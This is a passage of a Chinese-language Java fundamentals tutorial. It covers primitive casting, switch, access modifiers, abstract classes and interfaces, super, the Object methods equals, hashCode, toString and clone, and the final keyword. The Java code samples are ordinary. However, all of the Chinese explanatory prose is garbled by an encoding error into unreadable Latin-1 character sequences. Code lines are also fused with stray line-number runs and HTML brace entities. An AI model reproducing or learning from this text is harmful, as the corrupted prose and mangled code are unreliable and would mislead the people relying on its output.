System.out.println(dog.getObjectAddress()); // Dog@4554617c dog = new Dog("B"); System.out.println(dog.getObjectAddress()); // Dog@74a14482 System.out.println(dog.getName()); // B &#125;&#125; StackOverflow: Is Java â€œpass-by-referenceâ€ or â€œpass-by-valueâ€? float ä¸ double1.1 å­—é¢é‡å±äº double ç±»å‹ï¼Œä¸èƒ½ç›´æ¥å°† 1.1 ç›´æ¥èµ‹å€¼ç»™ float å˜é‡ï¼Œå› ä¸ºè¿™æ˜¯ä¸‹è½¬å‹ï¼Œä¼šä½¿å¾—ç²¾åº¦ä¸‹é™ï¼Œå› æ­¤ Java ä¸èƒ½éšå¼æ‰§è¡Œä¸‹è½¬å‹ã€‚ 1// float f = 1.1; 1.1f å­—é¢é‡æ‰æ˜¯ float ç±»å‹ã€‚ 1float f = 1.1f; éšå¼ç±»å‹è½¬æ¢å› ä¸ºå­—é¢é‡ 1 æ˜¯ int ç±»å‹ï¼Œå®ƒæ¯” short ç±»å‹ç²¾åº¦è¦é«˜ï¼Œå› æ­¤ä¸èƒ½éšå¼åœ°å°† int ç±»å‹ä¸‹è½¬å‹ä¸º short ç±»å‹ã€‚ 12short s1 = 1;// s1 = s1 + 1; ä½†æ˜¯ä½¿ç”¨ += è¿ç®—ç¬¦å¯ä»¥æ‰§è¡Œéšå¼ç±»å‹è½¬æ¢ã€‚ 1s1 += 1; ä¸Šé¢çš„è¯­å¥ç›¸å½“äºå°† s1 + 1 çš„è®¡ç®—ç»“æœè¿›è¡Œäº†å‘ä¸‹è½¬å‹ï¼š 1s1 = (short) (s1 + 1); StackOverflow : Why donâ€™t Javaâ€™s +=, -=, *=, /= compound assignment operators require casting? switchä» Java 7 å¼€å§‹ï¼Œå¯ä»¥åœ¨ switch æ¡ä»¶åˆ¤æ–­è¯­å¥ä¸­ä½¿ç”¨ String å¯¹è±¡ã€‚ 123456789String s = "a";switch (s) &#123; case "a": System.out.println("aaa"); break; case "b": System.out.println("bbb"); break;&#125; switch ä¸æ”¯æŒ longï¼Œæ˜¯å› ä¸º switch çš„è®¾è®¡åˆè¡·æ˜¯ä¸ºé‚£äº›åªéœ€è¦å¯¹å°‘æ•°çš„å‡ ä¸ªå€¼è¿›è¡Œç­‰å€¼åˆ¤æ–­ï¼Œå¦‚æœå€¼è¿‡äºå¤æ‚ï¼Œé‚£ä¹ˆè¿˜æ˜¯ç”¨ if æ¯”è¾ƒåˆé€‚ã€‚ 123456789// long x = 111;// switch (x) &#123; // Incompatible types. Found: 'long', required: 'char, byte, short, int, Character, Byte, Short, Integer, String, or an enum'// case 111:// System.out.println(111);// break;// case 222:// System.out.println(222);// break;// &#125; StackOverflow : Why canâ€™t your switch statement data type be long, Java? å››ã€ç»§æ‰¿è®¿é—®æƒé™Java ä¸­æœ‰ä¸‰ä¸ªè®¿é—®æƒé™ä¿®é¥°ç¬¦ï¼šprivateã€protected ä»¥åŠ publicï¼Œå¦‚æœä¸åŠ è®¿é—®ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºåŒ…çº§å¯è§ã€‚ å¯ä»¥å¯¹ç±»æˆ–ç±»ä¸­çš„æˆå‘˜ï¼ˆå­—æ®µä»¥åŠæ–¹æ³•ï¼‰åŠ ä¸Šè®¿é—®ä¿®é¥°ç¬¦ã€‚ æˆå‘˜å¯è§è¡¨ç¤ºå…¶å®ƒç±»å¯ä»¥ç”¨è¿™ä¸ªç±»çš„å®ä¾‹è®¿é—®åˆ°è¯¥æˆå‘˜ï¼› ç±»å¯è§è¡¨ç¤ºå…¶å®ƒç±»å¯ä»¥ç”¨è¿™ä¸ªç±»åˆ›å»ºå¯¹è±¡ã€‚ protected ç”¨äºä¿®é¥°æˆå‘˜ï¼Œè¡¨ç¤ºåœ¨ç»§æ‰¿ä½“ç³»ä¸­æˆå‘˜å¯¹äºå­ç±»å¯è§ï¼Œä½†æ˜¯è¿™ä¸ªè®¿é—®ä¿®é¥°ç¬¦å¯¹äºç±»æ²¡æœ‰æ„ä¹‰ã€‚ è®¾è®¡è‰¯å¥½çš„æ¨¡å—ä¼šéšè—æ‰€æœ‰çš„å®ç°ç»†èŠ‚ï¼ŒæŠŠå®ƒçš„ API ä¸å®ƒçš„å®ç°æ¸…æ™°åœ°éš”ç¦»å¼€æ¥ã€‚æ¨¡å—ä¹‹é—´åªé€šè¿‡å®ƒä»¬çš„ API è¿›è¡Œé€šä¿¡ï¼Œä¸€ä¸ªæ¨¡å—ä¸éœ€è¦çŸ¥é“å…¶ä»–æ¨¡å—çš„å†…éƒ¨å·¥ä½œæƒ…å†µï¼Œè¿™ä¸ªæ¦‚å¿µè¢«ç§°ä¸ºä¿¡æ¯éšè—æˆ–å°è£…ã€‚å› æ­¤è®¿é—®æƒé™åº”å½“å°½å¯èƒ½åœ°ä½¿æ¯ä¸ªç±»æˆ–è€…æˆå‘˜ä¸è¢«å¤–ç•Œè®¿é—®ã€‚ å¦‚æœå­ç±»çš„æ–¹æ³•è¦†ç›–äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå­ç±»ä¸­è¯¥æ–¹æ³•çš„è®¿é—®çº§åˆ«ä¸å…è®¸ä½äºçˆ¶ç±»çš„è®¿é—®çº§åˆ«ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿å¯ä»¥ä½¿ç”¨çˆ¶ç±»å®ä¾‹çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å­ç±»å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯ç¡®ä¿æ»¡è¶³é‡Œæ°æ›¿æ¢åŸåˆ™ã€‚ å­—æ®µå†³ä¸èƒ½æ˜¯å…¬æœ‰çš„ï¼Œå› ä¸ºè¿™ä¹ˆåšçš„è¯å°±å¤±å»äº†å¯¹è¿™ä¸ªå­—æ®µä¿®æ”¹è¡Œä¸ºçš„æ§åˆ¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥å¯¹å…¶éšæ„ä¿®æ”¹ã€‚å¯ä»¥ä½¿ç”¨å…¬æœ‰çš„ getter å’Œ setter æ–¹æ³•æ¥æ›¿æ¢å…¬æœ‰å­—æ®µã€‚ 123public class AccessExample &#123; public int x;&#125; 1234567891011public class AccessExample &#123; private int x; public int getX() &#123; return x; &#125; public void setX(int x) &#123; this.x = x; &#125;&#125; ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œå¦‚æœæ˜¯åŒ…çº§ç§æœ‰çš„ç±»æˆ–è€…ç§æœ‰çš„åµŒå¥—ç±»ï¼Œé‚£ä¹ˆç›´æ¥æš´éœ²æˆå‘˜ä¸ä¼šæœ‰ç‰¹åˆ«å¤§çš„å½±å“ã€‚ 123456789101112131415public class AccessWithInnerClassExample &#123; private class InnerClass &#123; int x; &#125; private InnerClass innerClass; public AccessWithInnerClassExample() &#123; innerClass = new InnerClass(); &#125; public int getValue() &#123; return innerClass.x; // ç›´æ¥è®¿é—® &#125;&#125; æŠ½è±¡ç±»ä¸æ¥å£1. æŠ½è±¡ç±» æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•éƒ½ä½¿ç”¨ abstract è¿›è¡Œå£°æ˜ã€‚æŠ½è±¡ç±»ä¸€èˆ¬ä¼šåŒ…å«æŠ½è±¡æ–¹æ³•ï¼ŒæŠ½è±¡æ–¹æ³•ä¸€å®šä½äºæŠ½è±¡ç±»ä¸­ã€‚ æŠ½è±¡ç±»å’Œæ™®é€šç±»æœ€å¤§çš„åŒºåˆ«æ˜¯ï¼ŒæŠ½è±¡ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼Œéœ€è¦ç»§æ‰¿æŠ½è±¡ç±»æ‰èƒ½å®ä¾‹åŒ–å…¶å­ç±»ã€‚ 1234567891011public abstract class AbstractClassExample &#123; protected int x; private int y; public abstract void func1(); public void func2() &#123; System.out.println("func2"); &#125;&#125; 123456public class AbstractExtendClassExample extends AbstractClassExample&#123; @Override public void func1() &#123; System.out.println("func1"); &#125;&#125; 123// AbstractClassExample ac1 = new AbstractClassExample(); // 'AbstractClassExample' is abstract; cannot be instantiatedAbstractClassExample ac2 = new AbstractExtendClassExample();ac2.func1(); 2. æ¥å£ æ¥å£æ˜¯æŠ½è±¡ç±»çš„å»¶ä¼¸ï¼Œåœ¨ Java 8 ä¹‹å‰ï¼Œå®ƒå¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªå®Œå…¨æŠ½è±¡çš„ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½æœ‰ä»»ä½•çš„æ–¹æ³•å®ç°ã€‚ ä» Java 8 å¼€å§‹ï¼Œæ¥å£ä¹Ÿå¯ä»¥æ‹¥æœ‰é»˜è®¤çš„æ–¹æ³•å®ç°ï¼Œè¿™æ˜¯å› ä¸ºä¸æ”¯æŒé»˜è®¤æ–¹æ³•çš„æ¥å£çš„ç»´æŠ¤æˆæœ¬å¤ªé«˜äº†ã€‚åœ¨ Java 8 ä¹‹å‰ï¼Œå¦‚æœä¸€ä¸ªæ¥å£æƒ³è¦æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œé‚£ä¹ˆè¦ä¿®æ”¹æ‰€æœ‰å®ç°äº†è¯¥æ¥å£çš„ç±»ã€‚ æ¥å£çš„æˆå‘˜ï¼ˆå­—æ®µ + æ–¹æ³•ï¼‰é»˜è®¤éƒ½æ˜¯ public çš„ï¼Œå¹¶ä¸”ä¸å…è®¸å®šä¹‰ä¸º private æˆ–è€… protectedã€‚ æ¥å£çš„å­—æ®µé»˜è®¤éƒ½æ˜¯ static å’Œ final çš„ã€‚ 1234567891011121314public interface InterfaceExample &#123; void func1(); default void func2()&#123; System.out.println("func2"); &#125; int x = 123; // int y; // Variable 'y' might not have been initialized public int z = 0; // Modifier 'public' is redundant for interface fields // private int k = 0; // Modifier 'private' not allowed here // protected int l = 0; // Modifier 'protected' not allowed here // private void fun3(); // Modifier 'private' not allowed here&#125; 123456public class InterfaceImplementExample implements InterfaceExample &#123; @Override public void func1() &#123; System.out.println("func1"); &#125;&#125; 1234// InterfaceExample ie1 = new InterfaceExample(); // 'InterfaceExample' is abstract; cannot be instantiatedInterfaceExample ie2 = new InterfaceImplementExample();ie2.func1();System.out.println(InterfaceExample.x); 3. æ¯”è¾ƒ ä»è®¾è®¡å±‚é¢ä¸Šçœ‹ï¼ŒæŠ½è±¡ç±»æä¾›äº†ä¸€ç§ IS-A å…³ç³»ï¼Œé‚£ä¹ˆå°±å¿…é¡»æ»¡è¶³é‡Œå¼æ›¿æ¢åŸåˆ™ï¼Œå³å­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚è€Œæ¥å£æ›´åƒæ˜¯ä¸€ç§ LIKE-A å…³ç³»ï¼Œå®ƒåªæ˜¯æä¾›ä¸€ç§æ–¹æ³•å®ç°å¥‘çº¦ï¼Œå¹¶ä¸è¦æ±‚æ¥å£å’Œå®ç°æ¥å£çš„ç±»å…·æœ‰ IS-A å…³ç³»ã€‚ ä»ä½¿ç”¨ä¸Šæ¥çœ‹ï¼Œä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œä½†æ˜¯ä¸èƒ½ç»§æ‰¿å¤šä¸ªæŠ½è±¡ç±»ã€‚ æ¥å£çš„å­—æ®µåªèƒ½æ˜¯ static å’Œ final ç±»å‹çš„ï¼Œè€ŒæŠ½è±¡ç±»çš„å­—æ®µæ²¡æœ‰è¿™ç§é™åˆ¶ã€‚ æ¥å£çš„æ–¹æ³•åªèƒ½æ˜¯ public çš„ï¼Œè€ŒæŠ½è±¡ç±»çš„æ–¹æ³•å¯ä»¥æœ‰å¤šç§è®¿é—®æƒé™ã€‚ 4. ä½¿ç”¨é€‰æ‹© ä½¿ç”¨æŠ½è±¡ç±»ï¼š éœ€è¦åœ¨å‡ ä¸ªç›¸å…³çš„ç±»ä¸­å…±äº«ä»£ç ã€‚ éœ€è¦èƒ½æ§åˆ¶ç»§æ‰¿æ¥çš„æ–¹æ³•å’ŒåŸŸçš„è®¿é—®æƒé™ï¼Œè€Œä¸æ˜¯éƒ½ä¸º publicã€‚ éœ€è¦ç»§æ‰¿éé™æ€ï¼ˆnon-staticï¼‰å’Œéå¸¸é‡ï¼ˆnon-finalï¼‰å­—æ®µã€‚ ä½¿ç”¨æ¥å£ï¼š éœ€è¦è®©ä¸ç›¸å…³çš„ç±»éƒ½å®ç°ä¸€ä¸ªæ–¹æ³•ï¼Œä¾‹å¦‚ä¸ç›¸å…³çš„ç±»éƒ½å¯ä»¥å®ç° Compareable æ¥å£ä¸­çš„ compareTo() æ–¹æ³•ï¼› éœ€è¦ä½¿ç”¨å¤šé‡ç»§æ‰¿ã€‚ åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œæ¥å£ä¼˜å…ˆäºæŠ½è±¡ç±»ï¼Œå› ä¸ºæ¥å£æ²¡æœ‰æŠ½è±¡ç±»ä¸¥æ ¼çš„ç±»å±‚æ¬¡ç»“æ„è¦æ±‚ï¼Œå¯ä»¥çµæ´»åœ°ä¸ºä¸€ä¸ªç±»æ·»åŠ è¡Œä¸ºã€‚å¹¶ä¸”ä» Java 8 å¼€å§‹ï¼Œæ¥å£ä¹Ÿå¯ä»¥æœ‰é»˜è®¤çš„æ–¹æ³•å®ç°ï¼Œä½¿å¾—ä¿®æ”¹æ¥å£çš„æˆæœ¬ä¹Ÿå˜çš„å¾ˆä½ã€‚ æ·±å…¥ç†è§£ abstract class å’Œ interface When to Use Abstract Class and Interface super è®¿é—®çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼šå¯ä»¥ä½¿ç”¨ super() å‡½æ•°è®¿é—®çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œä»è€Œå®Œæˆä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œã€‚ è®¿é—®çˆ¶ç±»çš„æˆå‘˜ï¼šå¦‚æœå­ç±»è¦†ç›–äº†çˆ¶ç±»çš„ä¸­æŸä¸ªæ–¹æ³•çš„å®ç°ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ super å…³é”®å­—æ¥å¼•ç”¨çˆ¶ç±»çš„æ–¹æ³•å®ç°ã€‚ 12345678910111213public class SuperExample &#123; protected int x; protected int y; public SuperExample(int x, int y) &#123; this.x = x; this.y = y; &#125; public void func() &#123; System.out.println("SuperExample.func()"); &#125;&#125; 1234567891011121314public class SuperExtendExample extends SuperExample &#123; private int z; public SuperExtendExample(int x, int y, int z) &#123; super(x, y); this.z = z; &#125; @Override public void func() &#123; super.func(); System.out.println("SuperExtendExample.func()"); &#125;&#125; 12SuperExample e = new SuperExtendExample(1, 2, 3);e.func(); 12SuperExample.func()SuperExtendExample.func() Using the Keyword super é‡å†™ä¸é‡è½½ é‡å†™ï¼ˆOverrideï¼‰å­˜åœ¨äºç»§æ‰¿ä½“ç³»ä¸­ï¼ŒæŒ‡å­ç±»å®ç°äº†ä¸€ä¸ªä¸çˆ¶ç±»åœ¨æ–¹æ³•å£°æ˜ä¸Šå®Œå…¨ç›¸åŒçš„ä¸€ä¸ªæ–¹æ³•ï¼› é‡è½½ï¼ˆOverloadï¼‰å­˜åœ¨äºåŒä¸€ä¸ªç±»ä¸­ï¼ŒæŒ‡ä¸€ä¸ªæ–¹æ³•ä¸å·²ç»å­˜åœ¨çš„æ–¹æ³•åç§°ä¸Šç›¸åŒï¼Œä½†æ˜¯å‚æ•°ç±»å‹ã€ä¸ªæ•°ã€é¡ºåºè‡³å°‘æœ‰ä¸€ä¸ªä¸åŒã€‚åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œè¿”å›å€¼ä¸åŒï¼Œå…¶å®ƒéƒ½ç›¸åŒä¸ç®—æ˜¯é‡è½½ã€‚ äº”ã€Object é€šç”¨æ–¹æ³•æ¦‚è§ˆ123456789101112131415161718192021public final native Class&lt;?&gt; getClass()public native int hashCode()public boolean equals(Object obj)protected native Object clone() throws CloneNotSupportedExceptionpublic String toString()public final native void notify()public final native void notifyAll()public final native void wait(long timeout) throws InterruptedExceptionpublic final void wait(long timeout, int nanos) throws InterruptedExceptionpublic final void wait() throws InterruptedExceptionprotected void finalize() throws Throwable &#123;&#125; equals()1. equals() ä¸ == çš„åŒºåˆ« å¯¹äºåŸºæœ¬ç±»å‹ï¼Œ== åˆ¤æ–­ä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼ŒåŸºæœ¬ç±»å‹æ²¡æœ‰ equals() æ–¹æ³•ã€‚ å¯¹äºå¼•ç”¨ç±»å‹ï¼Œ== åˆ¤æ–­ä¸¤ä¸ªå®ä¾‹æ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ï¼Œè€Œ equals() åˆ¤æ–­å¼•ç”¨çš„å¯¹è±¡æ˜¯å¦ç­‰ä»·ã€‚ 1234Integer x = new Integer(1);Integer y = new Integer(1);System.out.println(x.equals(y)); // trueSystem.out.println(x == y); // false 2. ç­‰ä»·å…³ç³» ï¼ˆä¸€ï¼‰è‡ªåæ€§ 1x.equals(x); // true ï¼ˆäºŒï¼‰å¯¹ç§°æ€§ 1x.equals(y) == y.equals(x); // true ï¼ˆä¸‰ï¼‰ä¼ é€’æ€§ 12if (x.equals(y) &amp;&amp; y.equals(z)) x.equals(z); // true; ï¼ˆå››ï¼‰ä¸€è‡´æ€§ å¤šæ¬¡è°ƒç”¨ equals() æ–¹æ³•ç»“æœä¸å˜ 1x.equals(y) == x.equals(y); // true ï¼ˆäº”ï¼‰ä¸ null çš„æ¯”è¾ƒ å¯¹ä»»ä½•ä¸æ˜¯ null çš„å¯¹è±¡ x è°ƒç”¨ x.equals(null) ç»“æœéƒ½ä¸º false 1x.euqals(null); // false; 3. å®ç° æ£€æŸ¥æ˜¯å¦ä¸ºåŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚æœæ˜¯ç›´æ¥è¿”å› trueï¼› æ£€æŸ¥æ˜¯å¦æ˜¯åŒä¸€ä¸ªç±»å‹ï¼Œå¦‚æœä¸æ˜¯ï¼Œç›´æ¥è¿”å› falseï¼› å°† Object å®ä¾‹è¿›è¡Œè½¬å‹ï¼› åˆ¤æ–­æ¯ä¸ªå…³é”®åŸŸæ˜¯å¦ç›¸ç­‰ã€‚ 1234567891011121314151617181920212223public class EqualExample &#123; private int x; private int y; private int z; public EqualExample(int x, int y, int z) &#123; this.x = x; this.y = y; this.z = z; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z; &#125;&#125; hashCode()hasCode() è¿”å›æ•£åˆ—å€¼ï¼Œè€Œ equals() æ˜¯ç”¨æ¥åˆ¤æ–­ä¸¤ä¸ªå®ä¾‹æ˜¯å¦ç­‰ä»·ã€‚ç­‰ä»·çš„ä¸¤ä¸ªå®ä¾‹æ•£åˆ—å€¼ä¸€å®šè¦ç›¸åŒï¼Œä½†æ˜¯æ•£åˆ—å€¼ç›¸åŒçš„ä¸¤ä¸ªå®ä¾‹ä¸ä¸€å®šç­‰ä»·ã€‚ åœ¨è¦†ç›– equals() æ–¹æ³•æ—¶åº”å½“æ€»æ˜¯è¦†ç›– hashCode() æ–¹æ³•ï¼Œä¿è¯ç­‰ä»·çš„ä¸¤ä¸ªå®ä¾‹æ•£åˆ—å€¼ä¹Ÿç›¸ç­‰ã€‚ ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæ–°å»ºäº†ä¸¤ä¸ªç­‰ä»·çš„å®ä¾‹ï¼Œå¹¶å°†å®ƒä»¬æ·»åŠ åˆ° HashSet ä¸­ã€‚æˆ‘ä»¬å¸Œæœ›å°†è¿™ä¸¤ä¸ªå®ä¾‹å½“æˆä¸€æ ·çš„ï¼Œåªåœ¨é›†åˆä¸­æ·»åŠ ä¸€ä¸ªå®ä¾‹ï¼Œä½†æ˜¯å› ä¸º EqualExample æ²¡æœ‰å®ç° hasCode() æ–¹æ³•ï¼Œå› æ­¤è¿™ä¸¤ä¸ªå®ä¾‹çš„æ•£åˆ—å€¼æ˜¯ä¸åŒçš„ï¼Œæœ€ç»ˆå¯¼è‡´é›†åˆæ·»åŠ äº†ä¸¤ä¸ªç­‰ä»·çš„å®ä¾‹ã€‚ 1234567EqualExample e1 = new EqualExample(1, 1, 1);EqualExample e2 = new EqualExample(1, 1, 1);System.out.println(e1.equals(e2)); // trueHashSet&lt;EqualExample&gt; set = new HashSet&lt;&gt;();set.add(e1);set.add(e2);System.out.println(set.size()); // 2 ç†æƒ³çš„æ•£åˆ—å‡½æ•°åº”å½“å…·æœ‰å‡åŒ€æ€§ï¼Œå³ä¸ç›¸ç­‰çš„å®ä¾‹åº”å½“å‡åŒ€åˆ†å¸ƒåˆ°æ‰€æœ‰å¯èƒ½çš„æ•£åˆ—å€¼ä¸Šã€‚è¿™å°±è¦æ±‚äº†æ•£åˆ—å‡½æ•°è¦æŠŠæ‰€æœ‰åŸŸçš„å€¼éƒ½è€ƒè™‘è¿›æ¥ï¼Œå¯ä»¥å°†æ¯ä¸ªåŸŸéƒ½å½“æˆ R è¿›åˆ¶çš„æŸä¸€ä½ï¼Œç„¶åç»„æˆä¸€ä¸ª R è¿›åˆ¶çš„æ•´æ•°ã€‚R ä¸€èˆ¬å– 31ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå¥‡ç´ æ•°ï¼Œå¦‚æœæ˜¯å¶æ•°çš„è¯ï¼Œå½“å‡ºç°ä¹˜æ³•æº¢å‡ºï¼Œä¿¡æ¯å°±ä¼šä¸¢å¤±ï¼Œå› ä¸ºä¸ 2 ç›¸ä¹˜ç›¸å½“äºå‘å·¦ç§»ä¸€ä½ã€‚ ä¸€ä¸ªæ•°ä¸ 31 ç›¸ä¹˜å¯ä»¥è½¬æ¢æˆç§»ä½å’Œå‡æ³•ï¼š31\*x == (x&lt;&lt;5)-xï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è¿›è¡Œè¿™ä¸ªä¼˜åŒ–ã€‚ 12345678@Overridepublic int hashCode() &#123; int result = 17; result = 31 * result + x; result = 31 * result + y; result = 31 * result + z; return result;&#125; toString()é»˜è®¤è¿”å› ToStringExample@4554617c è¿™ç§å½¢å¼ï¼Œå…¶ä¸­ @ åé¢çš„æ•°å€¼ä¸ºæ•£åˆ—ç çš„æ— ç¬¦å·åå…­è¿›åˆ¶è¡¨ç¤ºã€‚ 1234567public class ToStringExample &#123; private int number; public ToStringExample(int number) &#123; this.number = number; &#125;&#125; 12ToStringExample example = new ToStringExample(123);System.out.println(example.toString()); 1ToStringExample@4554617c clone()1. cloneable clone() æ˜¯ Object çš„ protect æ–¹æ³•ï¼Œå®ƒä¸æ˜¯ publicï¼Œä¸€ä¸ªç±»ä¸æ˜¾å¼å»é‡å†™ clone()ï¼Œå…¶å®ƒç±»å°±ä¸èƒ½ç›´æ¥å»è°ƒç”¨è¯¥ç±»å®ä¾‹çš„ clone() æ–¹æ³•ã€‚ 1234public class CloneExample &#123; private int a; private int b;&#125; 12CloneExample e1 = new CloneExample();// CloneExample e2 = e1.clone(); // 'clone()' has protected access in 'java.lang.Object' é‡å†™ clone() å¾—åˆ°ä»¥ä¸‹å®ç°ï¼š 123456789public class CloneExample &#123; private int a; private int b; @Override protected CloneExample clone() throws CloneNotSupportedException &#123; return (CloneExample)super.clone(); &#125;&#125; 123456CloneExample e1 = new CloneExample();try &#123; CloneExample e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125; 1java.lang.CloneNotSupportedException: CloneTest ä»¥ä¸ŠæŠ›å‡ºäº† CloneNotSupportedExceptionï¼Œè¿™æ˜¯å› ä¸º CloneTest æ²¡æœ‰å®ç° Cloneable æ¥å£ã€‚ 123456789public class CloneExample implements Cloneable &#123; private int a; private int b; @Override protected Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125;&#125; åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œclone() æ–¹æ³•å¹¶ä¸æ˜¯ Cloneable æ¥å£çš„æ–¹æ³•ï¼Œè€Œæ˜¯ Object çš„ä¸€ä¸ª protected æ–¹æ³•ã€‚Cloneable æ¥å£åªæ˜¯è§„å®šï¼Œå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç° Cloneable æ¥å£åˆè°ƒç”¨äº† clone() æ–¹æ³•ï¼Œå°±ä¼šæŠ›å‡º CloneNotSupportedExceptionã€‚ 2. æ·±æ‹·è´ä¸æµ…æ‹·è´ æµ…æ‹·è´ï¼šæ‹·è´å®ä¾‹å’ŒåŸå§‹å®ä¾‹çš„å¼•ç”¨ç±»å‹å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ï¼› æ·±æ‹·è´ï¼šæ‹·è´å®ä¾‹å’ŒåŸå§‹å®ä¾‹çš„å¼•ç”¨ç±»å‹å¼•ç”¨ä¸åŒå¯¹è±¡ã€‚ 1234567891011121314151617181920212223public class ShallowCloneExample implements Cloneable &#123; private int[] arr; public ShallowCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected ShallowCloneExample clone() throws CloneNotSupportedException &#123; return (ShallowCloneExample) super.clone(); &#125;&#125; 123456789ShallowCloneExample e1 = new ShallowCloneExample();ShallowCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 222 12345678910111213141516171819202122232425262728public class DeepCloneExample implements Cloneable &#123; private int[] arr; public DeepCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected DeepCloneExample clone() throws CloneNotSupportedException &#123; DeepCloneExample result = (DeepCloneExample) super.clone(); result.arr = new int[arr.length]; for (int i = 0; i &lt; arr.length; i++) &#123; result.arr[i] = arr[i]; &#125; return result; &#125;&#125; 123456789DeepCloneExample e1 = new DeepCloneExample();DeepCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 2 ä½¿ç”¨ clone() æ–¹æ³•æ¥æ‹·è´ä¸€ä¸ªå¯¹è±¡å³å¤æ‚åˆæœ‰é£é™©ï¼Œå®ƒä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¹¶ä¸”è¿˜éœ€è¦ç±»å‹è½¬æ¢ã€‚Effective Java ä¹¦ä¸Šè®²åˆ°ï¼Œæœ€å¥½ä¸è¦å»ä½¿ç”¨ clone()ï¼Œå¯ä»¥ä½¿ç”¨æ‹·è´æ„é€ å‡½æ•°æˆ–è€…æ‹·è´å·¥å‚æ¥æ‹·è´ä¸€ä¸ªå¯¹è±¡ã€‚ 12345678910111213141516171819202122232425public class CloneConstructorExample &#123; private int[] arr; public CloneConstructorExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public CloneConstructorExample(CloneConstructorExample original) &#123; arr = new int[original.arr.length]; for (int i = 0; i &lt; original.arr.length; i++) &#123; arr[i] = original.arr[i]; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125;&#125; 1234CloneConstructorExample e1 = new CloneConstructorExample();CloneConstructorExample e2 = new CloneConstructorExample(e1);e1.set(2, 222);System.out.println(e2.get(2)); // 2 å…­ã€å…³é”®å­—final1. æ•°æ® å£°æ˜æ•°æ®ä¸ºå¸¸é‡ï¼Œå¯ä»¥æ˜¯ç¼–è¯‘æ—¶å¸¸é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯åœ¨è¿è¡Œæ—¶è¢«åˆå§‹åŒ–åä¸èƒ½è¢«æ”¹å˜çš„å¸¸é‡ã€‚ å¯¹äºåŸºæœ¬ç±»å‹ï¼Œfinal ä½¿æ•°å€¼ä¸å˜ï¼› å¯¹äºå¼•ç”¨ç±»å‹ï¼Œfinal ä½¿å¼•ç”¨ä¸å˜ï¼Œä¹Ÿå°±ä¸èƒ½å¼•ç”¨å…¶å®ƒå¯¹è±¡ï¼Œä½†æ˜¯è¢«å¼•ç”¨çš„å¯¹è±¡æœ¬èº«æ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚ 1234final int x = 1;// x = 2; // cannot assign value to final variable 'x'final A y = new A();y.a = 1; 2. æ–¹æ³• å£°æ˜æ–¹æ³•ä¸èƒ½è¢«å­ç±»é‡å†™ã€‚ private æ–¹æ³•éšå¼åœ°è¢«æŒ‡å®šä¸º finalï¼Œå¦‚æœåœ¨å­ç±»ä¸­å®šä¹‰çš„æ–¹æ³•å’ŒåŸºç±»ä¸­çš„ä¸€ä¸ª private æ–¹æ³•ç­¾åç›¸åŒï¼Œæ­¤æ—¶å­ç±»çš„æ–¹æ³•ä¸æ˜¯é‡å†™åŸºç±»æ–¹æ³•ï¼Œè€Œæ˜¯åœ¨å­ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚ 3. ç±» å£°æ˜ç±»ä¸å…è®¸è¢«ç»§æ‰¿ã€‚ static1. é™æ€å˜é‡ 